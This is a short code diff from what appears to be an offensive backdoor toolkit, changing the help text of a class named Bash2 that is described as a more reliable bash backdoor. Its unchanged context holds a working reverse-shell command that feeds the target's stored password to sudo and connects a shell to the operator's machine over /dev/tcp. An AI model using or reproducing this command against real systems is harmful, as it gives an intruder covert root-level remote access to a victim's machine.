@@ -14,7 +14,7 @@ class Bash2(Backdoor):
                 }
         self.allow_modules = True
         self.modules = {} 
-        self.help_text = ""
+        self.help_text = INFO + "A slightly different (and more reliable) version of the other bash backdoor, which does not prompt for the password on the client-side."
     
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup 0<&196;exec 196<>/dev/tcp/" + self.core.localIP + "/%s; sh <&196 >&196 2>&196" % self.get_value("port")
